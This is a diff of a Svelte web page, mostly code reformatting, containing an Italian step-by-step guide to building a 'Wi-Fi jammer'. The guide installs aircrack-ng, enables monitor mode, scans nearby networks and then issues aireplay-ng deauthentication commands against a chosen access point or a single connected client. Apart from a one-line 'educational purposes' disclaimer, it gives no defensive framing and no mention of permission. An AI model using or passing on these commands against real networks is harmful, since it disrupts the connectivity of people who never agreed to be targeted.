@@ -4,8 +4,11 @@
 </script>
 
 <svelte:head>
-<link rel="stylesheet" href="/css/jammer.css">
-<link rel="stylesheet" href="https://unpkg.com/purecss@1.0.1/build/base-min.css">
+  <link rel="stylesheet" href="/css/jammer.css" />
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/purecss@1.0.1/build/base-min.css"
+  />
 </svelte:head>
 
 <section>
@@ -24,74 +27,105 @@
       imgcomment="Un jammer a 18 frequenze"
       imgsrc="/img/jammer.png"
     />
-  </div>  
-  <hr class="uk-divider-icon">
+  </div>
+  <hr class="uk-divider-icon" />
   <h1>Costruiamo un Jammer Wi-Fi</h1>
   <div align="center" class="container">
-    <h5>La guida è a scopo didattico, i creatori non sono responsabili di eventuali disagi arrecati ad altri seguendo questa guida.
+    <h5>
+      La guida è a scopo didattico, i creatori non sono responsabili di
+      eventuali disagi arrecati ad altri seguendo questa guida.
     </h5>
-    <p>Per questa guida ci servirà una distribuzione di Linux o BSD o Mac OS e una scheda di rete compatibile(Trovate alcuni dei modelli compatibile <a href="javascript:window.open('https://www.kali.org/docs/nethunter/wireless-cards/')">qui</a>)</p>
-    <hr class="uk-divider-icon">
+    <p>
+      Per questa guida ci servirà una distribuzione di Linux o BSD o Mac OS e
+      una scheda di rete compatibile(Trovate alcuni dei modelli compatibile <a
+        href="javascript:window.open('https://www.kali.org/docs/nethunter/wireless-cards/')"
+        >qui</a
+      >)
+    </p>
+    <hr class="uk-divider-icon" />
     <p>Installiamo la suite di Aircrack sul nostro OS</p>
     <Bash
-    command="sudo apt-get install aircrack-ng #Debian e derivate"
-    background="black"
-    commandcolor="green">
-    </Bash>
-    <Bash
-    command="sudo yum install aircrack-ng #Red Hat e derivate"
-    background="black"
-    commandcolor="green">
-    </Bash>
-    <Bash
-    command="sudo pacman -S aircrack-ng #Arch Linux e derivate"
-    background="black"
-    commandcolor="green">
-    </Bash>
-    <Bash
-    command="brew install aircrack-ng #Mac OS"
-    background="black"
-    commandcolor="green">
-    </Bash>
-    <p>Ora prendiamo il nome della nostra scheda Wi-Fi attraverso il seguente comando</p>
-    <Bash
-      command="iwconfig"
+      command="sudo apt-get install aircrack-ng #Debian e derivate"
       background="black"
-      commandcolor="green">
-    </Bash>
-    <p>Adesso che sappiamo il nome della scheda, avviamo airmon per mandare la nostra scheda di rete in Monitor Mode, una modalità dove possiamo catturare i pacchetti Wi-Fi(Handshake di autorizzazione, dispositivi connessi ad una rete...) e analizzare completamente lo spettro 2.4 Ghz e 5 Ghz (chiaramente dipende dall'adattatore).</p>
+      commandcolor="green"
+    />
+    <Bash
+      command="sudo yum install aircrack-ng #Red Hat e derivate"
+      background="black"
+      commandcolor="green"
+    />
+    <Bash
+      command="sudo pacman -S aircrack-ng #Arch Linux e derivate"
+      background="black"
+      commandcolor="green"
+    />
+    <Bash
+      command="brew install aircrack-ng #Mac OS"
+      background="black"
+      commandcolor="green"
+    />
+    <p>
+      Ora prendiamo il nome della nostra scheda Wi-Fi attraverso il seguente
+      comando
+    </p>
+    <Bash command="iwconfig" background="black" commandcolor="green" />
+    <p>
+      Adesso che sappiamo il nome della scheda, avviamo airmon per mandare la
+      nostra scheda di rete in Monitor Mode, una modalità dove possiamo
+      catturare i pacchetti Wi-Fi(Handshake di autorizzazione, dispositivi
+      connessi ad una rete...) e analizzare completamente lo spettro 2.4 Ghz e 5
+      Ghz (chiaramente dipende dall'adattatore).
+    </p>
     <Bash
       command="airmon-ng start wlan0"
       background="black"
-      commandcolor="green">
-    </Bash>
-    <p>Se il comando non dà errori la nostra scheda è pronta per catturare tutto lo spettro.</p>
+      commandcolor="green"
+    />
+    <p>
+      Se il comando non dà errori la nostra scheda è pronta per catturare tutto
+      lo spettro.
+    </p>
     <p>Iniziamo ad analizzare lo spettro con il seguente comando</p>
     <Bash
       command="airodump-ng wlan0mon #wlan0mon = nome scheda + mon"
       background="black"
       commandcolor="green"
-    >
-  </Bash>
-  <!--Immagine di prova, appena arriva un portatile la sostituisco :-) -->
-  <img src="/img/airodump.png" alt="airodump" class="pure-img"/>
-  <p>Come possiamo vedere qui abbiamo tutte le informazioni delle nostre reti Wi-Fi come il BSSID, la potenza, l'SSID e altri parametri, in basso ci sono tutti i client connessi alle reti.</p>
-  <p>Quello che ci serve da questa schermata è il BSSID che vogliamo attaccare con il nostro Jammer.</p>
-  <p>Una volta preso il BSSID lanciamo il seguente comando sostituendo il BSSID e il canale di trasmissione.</p>
-  <Bash
-    command="aireplay-ng -0 1 -a 00:14:6C:7E:40:80 wlan0mon # dopo -a mettiamo il BSSID"
-    background="black"
-    commandcolor="green"
-  > 
-  </Bash>
-  <p>Per un attacco più preciso possiamo mirare ad un client unico e non all'intero Wi-Fi, prendendo uno dei client connessi al Wi-Fi dalla schermata di airodump(dalla colonna STATION), facendo attenzione che il BSSID coincida.</p>
-  <Bash
-    command=" aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon # dopo -c mettiamo il MAC address del client che vogliamo deautenticare"
-    background="black"
-    commandcolor="green"
-  > 
-  </Bash>
-  <p>Dopo l'inizio dell'attacco il client inizierà a non ricevere più connessione anche se lui sarà sempre connesso alla rete secondo il suo OS.</p>
+    />
+    <!--Immagine di prova, appena arriva un portatile la sostituisco :-) -->
+    <img src="/img/airodump.png" alt="airodump" class="pure-img" />
+    <p>
+      Come possiamo vedere qui abbiamo tutte le informazioni delle nostre reti
+      Wi-Fi come il BSSID, la potenza, l'SSID e altri parametri, in basso ci
+      sono tutti i client connessi alle reti.
+    </p>
+    <p>
+      Quello che ci serve da questa schermata è il BSSID che vogliamo attaccare
+      con il nostro Jammer.
+    </p>
+    <p>
+      Una volta preso il BSSID lanciamo il seguente comando sostituendo il BSSID
+      e il canale di trasmissione.
+    </p>
+    <Bash
+      command="aireplay-ng -0 1 -a 00:14:6C:7E:40:80 wlan0mon # dopo -a mettiamo il BSSID"
+      background="black"
+      commandcolor="green"
+    />
+    <p>
+      Per un attacco più preciso possiamo mirare ad un client unico e non
+      all'intero Wi-Fi, prendendo uno dei client connessi al Wi-Fi dalla
+      schermata di airodump(dalla colonna STATION), facendo attenzione che il
+      BSSID coincida.
+    </p>
+    <Bash
+      command=" aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon # dopo -c mettiamo il MAC address del client che vogliamo deautenticare"
+      background="black"
+      commandcolor="green"
+    />
+    <p>
+      Dopo l'inizio dell'attacco il client inizierà a non ricevere più
+      connessione anche se lui sarà sempre connesso alla rete secondo il suo OS.
+    </p>
   </div>
-  <br>
+  <br />
 </section>
